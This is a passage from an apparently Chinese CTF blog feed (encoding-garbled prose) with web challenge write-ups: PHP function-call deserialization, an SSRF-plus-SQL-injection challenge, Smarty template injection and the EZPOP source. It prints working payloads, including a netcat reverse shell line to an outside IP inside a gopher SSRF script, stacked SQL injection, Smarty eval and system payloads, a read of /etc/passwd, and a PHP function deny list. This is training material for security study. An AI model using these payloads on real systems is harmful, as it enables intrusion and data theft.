<p>äºæ˜¯æ„é€ ï¼š</p>
<p><img src="image-20201028192957104.png" alt="image-20201028192957104"></p>
<p>å¾—åˆ°æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $disable_fun = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params">$func, $p</span>) </span>&#123;</span><br><span class="line">        $result = call_user_func($func, $p);</span><br><span class="line">        $a= gettype($result);</span><br><span class="line">        <span class="keyword">if</span> ($a == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $result;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $p = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> $func = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $func = $_REQUEST[<span class="string">&quot;func&quot;</span>];</span><br><span class="line">    $p = $_REQUEST[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($func != <span class="literal">null</span>) &#123;</span><br><span class="line">        $func = strtolower($func);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime($func, $p);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¹‹åæˆ‘åˆå¡ä½äº†ï¼Œçœ‹ä¼¼å¥½åƒæ˜¯ååºåˆ—åŒ–ï¼Œåˆå¥½åƒä¸æ˜¯å•Šï¼Ÿæ‰¾ä¸åˆ°ååºåˆ—åŒ–çš„ç‚¹ï¼Œä¸€æ—¶é—´åˆåƒµä½äº†ï¼Œè¿‡äº†ä¸€ä¼šå„¿çœ‹äº†å¤§ä½¬çš„WPæ‰æ„è¯†åˆ°æ˜¯è‡ªå·±æ€è·¯è¿˜ä¸å¤Ÿçµæ´»ï¼Œè¿™é“é¢˜æ²¡æœ‰unserializeï¼Œä½†æ˜¯å¯ä»¥åŠ¨è°ƒå‡½æ•°ï¼Œå®¡è®¡ä»£ç ä¸­çš„Testç±»ï¼Œå…¶å®ä»–æ˜¯æœ‰gettimeçš„ï¼Œè¿™ä¸ªå‡½æ•°å°±æ˜¯ä¸€ä¸ªåŠ¨è°ƒå‡½æ•°ï¼Œé‚£æˆ‘ä»¬çš„æ€è·¯å°±å¾ˆæ˜ç¡®</p>
<h1 id="2-æ„é€ payload"><a href="#2-æ„é€ payload" class="headerlink" title="2.æ„é€ payload"></a>2.æ„é€ payload</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> $p = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> $func = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    function __destruct() &#123;</span></span><br><span class="line"><span class="comment">//        if ($this-&gt;func != &quot;&quot;) &#123;</span></span><br><span class="line"><span class="comment">//            echo gettime($this-&gt;func, $this-&gt;p);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br><span class="line">$test = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="keyword">echo</span> (serialize($test));</span><br></pre></td></tr></table></figure>

<p>ä¹‹åå°†è¿™ä¸€æ®µå¸¦å…¥åˆ°é¢˜ç›®å½“ä¸­ï¼Œæœ€ç»ˆåœ¨tmpç›®å½•ä¸‹æ‰¾åˆ°</p>
<p><img src="image-20201028192936143.png" alt="image-20201028192936143"></p>
]]></content>
      <tags>
        <tag>BUU</tag>
      </tags>
  </entry>
  <entry>
    <title>2021è™ç¬¦æ¯éƒ¨åˆ†web</title>
    <url>/2021/04/03/2021%E8%99%8E%E7%AC%A6%E6%9D%AF%E9%83%A8%E5%88%86web/</url>
    <content><![CDATA[<h1 id="â€œæ…¢æ…¢åšâ€ç®¡ç†ç³»ç»Ÿ"><a href="#â€œæ…¢æ…¢åšâ€ç®¡ç†ç³»ç»Ÿ" class="headerlink" title="â€œæ…¢æ…¢åšâ€ç®¡ç†ç³»ç»Ÿ"></a>â€œæ…¢æ…¢åšâ€ç®¡ç†ç³»ç»Ÿ</h1><p>è¿™é“é¢˜æ˜¯sqlå’Œssrfçš„ç»“åˆï¼Œæ„Ÿè§‰è¿˜æ˜¯æŒºæœ‰æ„æ€çš„ã€‚å¯æƒœè‡ªå·±SSRFçœŸçš„èœï¼Œ</p>
<p>ç¬¬ä¸€æ­¥æ¯”è¾ƒå‘ï¼Œè¿™ä¸ªæ¯”è¾ƒéš¾æƒ³åˆ°..</p>
<p>ä¸è¿‡å¥½é™©åé—¨ç»™äº†hintï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">è¿™ä¸ªsqlå§ï¼Œæœ‰ç‚¹ssrfçš„æ ·å­ï¼Œé¦–é¡µæ˜¯ä¸€ä¸ªå¾ˆæ™®é€šçš„sqlæ³¨å…¥ï¼Œæ²¡æœ‰ä»€ä¹ˆèŠ±æ ·ï¼Œä½†æ˜¯æˆ‘çš„admin.phpæ˜¯ä¸€ä¸ªå†…ç½‘çš„ç®¡ç†ç³»ç»Ÿï¼Œåªè¦ä½ ç”¨â€œçœŸ-adminâ€çš„å¯†ç ç™»å½•äº†ï¼Œå°±å¯ä»¥æ‹¿åˆ°flagï¼Œåæ­£æ…¢æ…¢åšå°±å¯¹äº†ï¼Œä¸è¦æ€¥èºï¼Œé™ä¸‹å¿ƒã€‚</span><br><span class="line">ç¬¬ä¸€æ­¥ç™»å½•çš„sqlè¯­å¥æ˜¯&quot;SELECT * FROM users WHERE password = &#x27;&quot;.md5($password,true).&quot;&#x27; limit 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p>é‚£æˆ‘ä»¬å°è¯•ffifdyopï¼Œç»“æœè¢«è¿‡æ»¤äº†ï¼Œä¸è¿‡æ²¡äº‹ï¼Œè¿˜æœ‰å¦å¤–å‡ ä¸ªpayloadï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">4611686052576742364</span><br><span class="line">e58</span><br><span class="line">129581926211651571912466741651878684928</span><br></pre></td></tr></table></figure>

<p>éšåæ‰“ä¸€ä¸ªéƒ½å¯ä»¥ã€‚</p>
<p>è¿›å»ä¹‹åå…è®¸æˆ‘ä»¬æ‰“ssrfäº†ï¼Œ</p>
<p><img src="image-20210403203653415.png" alt="image-20210403203653415"></p>
<p>è¿™ä¸ªæç¤ºå¾ˆæ˜æ˜¾äº†ï¼Œç”¨gopheråè®®å»æ‰“ï¼Œå¯æƒœè‡ªå·±å¹¶ä¸ä¼šssrfã€ã€‘ã€‚</p>
<p>çœ‹äº†ç¯‡è¿™ä¸ªæ–‡ç« ï¼Œå‘ç°å¯ä»¥è¯•è¯•çœ‹è¿™ä¸ªï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">https://zhuanlan.zhihu.com/p/<span class="number">112055947</span></span><br><span class="line">è„šæœ¬ï¼š</span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> urllib2,urllib</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.0.109/ssrf/base/curl_exec.php?url=&quot;</span></span><br><span class="line">header = <span class="string">&quot;&quot;&quot;gopher://192.168.0.119:8080/_GET /S2-045/ HTTP/1.1</span></span><br><span class="line"><span class="string">Host:192.168.0.119</span></span><br><span class="line"><span class="string">Content-Type:&quot;&quot;&quot;</span></span><br><span class="line">cmd = <span class="string">&quot;nc -e /bin/bash 192.168.0.109 6666&quot;</span></span><br><span class="line">content_type = <span class="string">&quot;&quot;&quot;è‡ªå·±å¡«å†™(ä¸è¦æœ‰æ¢è¡Œ)&quot;&quot;&quot;</span></span><br><span class="line">header_encoder = <span class="string">&quot;&quot;</span></span><br><span class="line">content_type_encoder = <span class="string">&quot;&quot;</span></span><br><span class="line">content_type_encoder_2 = <span class="string">&quot;&quot;</span></span><br><span class="line">url_char = [<span class="string">&quot; &quot;</span>]</span><br><span class="line">nr = <span class="string">&quot;\r\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¼–ç è¯·æ±‚å¤´</span></span><br><span class="line"><span class="keyword">for</span> single_char <span class="keyword">in</span> header:</span><br><span class="line">    <span class="keyword">if</span> single_char <span class="keyword">in</span> url_char:</span><br><span class="line">        header_encoder += urllib.quote(urllib.quote(single_char,<span class="string">&#x27;utf-8&#x27;</span>),<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        header_encoder += single_char</span><br><span class="line"></span><br><span class="line">header_encoder = header_encoder.replace(<span class="string">&quot;\n&quot;</span>,urllib.quote(urllib.quote(nr,<span class="string">&#x27;utf-8&#x27;</span>),<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¼–ç content-typeï¼Œç¬¬ä¸€æ¬¡ç¼–ç </span></span><br><span class="line"><span class="keyword">for</span> single_char <span class="keyword">in</span> content_type:</span><br><span class="line">    <span class="comment"># å…ˆè½¬ä¸ºASCII,åœ¨è½¬åå…­è¿›åˆ¶å³å¯å˜ä¸ºURLç¼–ç </span></span><br><span class="line">    content_type_encoder += <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">ord</span>(single_char)))</span><br><span class="line">content_type_encoder = content_type_encoder.replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;%&quot;</span>) + urllib.quote(nr,<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment"># ç¼–ç content-typeï¼Œç¬¬äºŒæ¬¡ç¼–ç </span></span><br><span class="line"><span class="keyword">for</span> single_char <span class="keyword">in</span> content_type_encoder:</span><br><span class="line">    <span class="comment"># å…ˆè½¬ä¸ºASCII,åœ¨è½¬åå…­è¿›åˆ¶å³å¯å˜ä¸ºURLç¼–ç </span></span><br><span class="line">    content_type_encoder_2 += <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">ord</span>(single_char)))</span><br><span class="line">content_type_encoder_2 = content_type_encoder_2.replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;%&quot;</span>)</span><br><span class="line">exp = url + header_encoder + content_type_encoder_2</span><br><span class="line"><span class="built_in">print</span> exp</span><br><span class="line">request = urllib2.Request(exp)</span><br><span class="line">response = urllib2.urlopen(request).read()</span><br><span class="line"><span class="built_in">print</span> response</span><br></pre></td></tr></table></figure>

<p>å…¶å®ä¼šæ‰“ssrfçš„è¯è¿™é¢˜å¹¶ä¸æ˜¯å¾ˆéš¾ï¼Œè·Ÿå¼ºç½‘æ¯çš„éšä¾¿æ³¨æ˜¯ä¸€ä¸ªæ„æ€ï¼Œç›´æ¥ç…§æŠ„æ€è·¯å³å¯ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="comment"># z = &quot;username=&#123;&#125;&amp;password=123&quot;.format((</span></span><br><span class="line"><span class="comment">#                                           &quot;admin1&#x27;;use ctf2;rename table fake_admin to fake_admin1;rename table &quot;</span></span><br><span class="line"><span class="comment">#                                           &quot;real_admin_here_do_you_find to fake_admin;show tables;#&quot;))</span></span><br><span class="line">z = <span class="string">&quot;username=&#123;&#125;&amp;password=123&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;admin&#x27;;show databases;&quot;</span>)</span><br><span class="line"><span class="comment"># table real_admin_here_do_you_find</span></span><br><span class="line"><span class="comment"># use ctf2;rename table real_admin_here_do_you_find to fake_admin</span></span><br><span class="line"><span class="comment"># z=&quot;username=&#123;&#125;&amp;password=123&quot;.format((&quot;admin1&#x27;;use ctf2;desc real_admin_here_do_you_find;#&quot;))</span></span><br><span class="line"><span class="comment"># z=&quot;username=admin&amp;password=5fb4e07de914cfc82afb44vbaf402203&quot;</span></span><br><span class="line">a = <span class="string">&#x27;&#x27;&#x27;POST /admin.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: &#123;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#125;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">a = a.<span class="built_in">format</span>(<span class="built_in">len</span>(z), z)</span><br><span class="line">res = urllib.parse.quote(urllib.parse.quote(a).replace(<span class="string">&#x27;%0A&#x27;</span>, <span class="string">&#x27;%0d%0A&#x27;</span>))</span><br><span class="line"><span class="comment"># payload = &#x27;gopher://127.0.0.1/_&#x27;+res</span></span><br><span class="line">payload = <span class="string">&#x27;gopher://127.0.0.1:80/_&#x27;</span> + res + <span class="string">&quot;%250d%250A&quot;</span></span><br><span class="line">print(payload)</span><br></pre></td></tr></table></figure>

<p>å†ctf2ä¸­æˆ‘ä»¬å¯ä»¥æŸ¥çœ‹åˆ°ï¼š</p>
<p><img src="image-20210403205334277.png" alt="image-20210403205334277"></p>
<h1 id="unsetme"><a href="#unsetme" class="headerlink" title="unsetme"></a>unsetme</h1>]]></content>
      <tags>
        <tag>PHP</tag>
        <tag>SSRF</tag>
        <tag>[object Object]</tag>
      </tags>
  </entry>
  <entry>
    <title>CISCN2019WEB11</title>
    <url>/2020/12/08/CISCN2019WEB11/</url>
    <content><![CDATA[<h1 id="çŸ¥è¯†ç‚¹ï¼š"><a href="#çŸ¥è¯†ç‚¹ï¼š" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h1><ol>
<li>XFFæ³¨å…¥</li>
<li>æ¨¡æ¿æ³¨å…¥smarty</li>
</ol>
<h2 id="smarty"><a href="#smarty" class="headerlink" title="smarty"></a>smarty</h2><p>â€‹    è¿™æ˜¯PHPçš„ä¸€ä¸ªæ¨¡æ¿è¯­è¨€ï¼Œç±»ä¼¼äºflaskçš„jinjia2ï¼Œsmartyä¹Ÿå¯ä»¥è®©æˆ‘ä»¬è§£æPHPçš„é€»è¾‘è¯­è¨€ï¼Œæ¯”å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡{system(â€œlsâ€)}æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œé™¤æ­¤ä¹‹å¤–ï¼ŒPHPsmartyè¿˜æœ‰å¾ˆå¤šéªšæ€è·¯ï¼š</p>
<h3 id="php-php"><a href="#php-php" class="headerlink" title="{php}{/php}"></a>{php}{/php}</h3><p> å¯ä»¥æ‰§è¡Œphpçš„ä»£ç </p>
<p>ä¾‹å­ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">&#123;php&#125;eval($_POST[0]);&#123;/php&#125;</span><br></pre></td></tr></table></figure>

<h3 id="literal"><a href="#literal" class="headerlink" title="{literal}"></a>{literal}</h3><p>è¯¥æ ‡ç­¾å¯ä»¥è®©ä¸€æ®µæ ‡ç­¾ä»£ç åŸæ ·è¾“å‡ºï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">&#123;literal&#125;&lt;script language=&quot;php&quot;&gt;system(&quot;ls&quot;);&lt;/script&gt;&#123;/literal&#125;</span><br></pre></td></tr></table></figure>

<h3 id="é™æ€æ–¹æ³•"><a href="#é™æ€æ–¹æ³•" class="headerlink" title="é™æ€æ–¹æ³•"></a>é™æ€æ–¹æ³•</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">&#123;self::getStreamVariable(â€œfile:///etc/passwdâ€)&#125;</span><br></pre></td></tr></table></figure>

<h3 id="if-æ ‡ç­¾"><a href="#if-æ ‡ç­¾" class="headerlink" title="{if}æ ‡ç­¾"></a>{if}æ ‡ç­¾</h3><p>å®˜æ–¹æ–‡æ¡£ä¸­çœ‹åˆ°è¿™æ ·çš„æè¿°ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Smartyçš„&#123;if&#125;æ¡ä»¶åˆ¤æ–­å’ŒPHPçš„iféå¸¸ç›¸ä¼¼ï¼Œåªæ˜¯å¢åŠ äº†ä¸€äº›ç‰¹æ€§ã€‚æ¯ä¸ª&#123;if&#125;å¿…é¡»æœ‰ä¸€ä¸ªé…å¯¹çš„&#123;/if&#125;ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨&#123;else&#125; å’Œ &#123;elseif&#125;ï¼Œå…¨éƒ¨çš„PHPæ¡ä»¶è¡¨è¾¾å¼å’Œå‡½æ•°éƒ½å¯ä»¥åœ¨ifå†…ä½¿ç”¨ï¼Œå¦‚||*, or, &amp;&amp;, and, is_array(), ç­‰ç­‰ï¼Œå¦‚ï¼š&#123;if is_array($array)&#125;&#123;/if&#125;*</span><br></pre></td></tr></table></figure>

<p>ä¸Šè¿°éƒ½æ‘˜è‡ªæ–‡ç« ï¼š<a href="https://blog.csdn.net/qq_45521281/article/details/107556915">https://blog.csdn.net/qq_45521281/article/details/107556915</a></p>
<h1 id="åšé¢˜æ€è·¯"><a href="#åšé¢˜æ€è·¯" class="headerlink" title="åšé¢˜æ€è·¯"></a>åšé¢˜æ€è·¯</h1><p>é¢˜ç›®å¼€å§‹å°±ç»™äº†IPçš„åœ°æ–¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨è¿™é‡Œè¿›è¡Œæ³¨å…¥ï¼Œå¼€å§‹æˆ‘è¿˜ä»¥ä¸ºæ˜¯SQLMAPã€‚ã€‚ä¸è¿‡åæ¥å‘ç°ä¸æ˜¯ï¼Œæ˜¯SMARTYæ¨¡æ¿æ³¨å…¥</p>
<p>æ•…æˆ‘ä»¬ç›´æ¥åœ¨XXFè¾“å‡º{system(â€œcat /flagâ€)} æˆ–è€…{if system(â€œcat /flagâ€)}{/if}</p>
]]></content>
      <tags>
        <tag>BUU</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>De1CTF2019SSRFMe</title>
    <url>/2021/01/12/De1CTF2019SSRFMe/</url>
    <content><![CDATA[]]></content>
      <tags>
        <tag>SSRF</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>EIS2019_EZPOP</title>
    <url>/2021/03/26/EIS2019-EZPOP/</url>
    <content><![CDATA[<p>é¢˜ç›®å¼€å±€ç»™æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $store;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $key;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $expire;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$store, $key = <span class="string">&#x27;flysystem&#x27;</span>, $expire = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key = $key;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store = $store;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;expire = $expire;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanContents</span>(<span class="params"><span class="keyword">array</span> $contents</span>) </span>&#123;</span><br><span class="line">        $cachedProperties = array_flip([</span><br><span class="line">            <span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;dirname&#x27;</span>, <span class="string">&#x27;basename&#x27;</span>, <span class="string">&#x27;extension&#x27;</span>, <span class="string">&#x27;filename&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;size&#x27;</span>, <span class="string">&#x27;mimetype&#x27;</span>, <span class="string">&#x27;visibility&#x27;</span>, <span class="string">&#x27;timestamp&#x27;</span>, <span class="string">&#x27;type&#x27;</span>,</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($contents <span class="keyword">as</span> $path =&gt; $object) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_array($object)) &#123;</span><br><span class="line">                $contents[$path] = array_intersect_key($object, $cachedProperties);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $contents;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getForStorage</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $cleaned = <span class="keyword">$this</span>-&gt;cleanContents(<span class="keyword">$this</span>-&gt;cache);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> json_encode([$cleaned, <span class="keyword">$this</span>-&gt;complete]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $contents = <span class="keyword">$this</span>-&gt;getForStorage();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;store-&gt;set(<span class="keyword">$this</span>-&gt;key, $contents, <span class="keyword">$this</span>-&gt;expire);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;autosave) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getExpireTime</span>(<span class="params">$expire</span>): <span class="title">int</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">int</span>) $expire;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span>(<span class="params"><span class="keyword">string</span> $name</span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] . $name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span>(<span class="params">$data</span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_numeric($data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">string</span>) $data;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $serialize = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $serialize($data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params">$name, $value, $expire = <span class="literal">null</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;writeTimes++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_null($expire)) &#123;</span><br><span class="line">            $expire = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;expire&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;getExpireTime($expire);</span><br><span class="line">        $filename = <span class="keyword">$this</span>-&gt;getCacheKey($name);</span><br><span class="line"></span><br><span class="line">        $dir = dirname($filename);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!is_dir($dir)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                mkdir($dir, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (\<span class="built_in">Exception</span> $e) &#123;</span><br><span class="line">                <span class="comment">// åˆ›å»ºå¤±è´¥</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;serialize($value);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>] &amp;&amp; function_exists(<span class="string">&#x27;gzcompress&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">//æ•°æ®å‹ç¼©</span></span><br><span class="line">            $data = gzcompress($data, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $data = <span class="string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="string">&#x27;%012d&#x27;</span>, $expire) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . $data;</span><br><span class="line">        $result = file_put_contents($filename, $data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($result) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;src&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dir = <span class="string">&quot;uploads/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_dir($dir))</span><br><span class="line">&#123;</span><br><span class="line">    mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_GET[<span class="string">&quot;data&quot;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

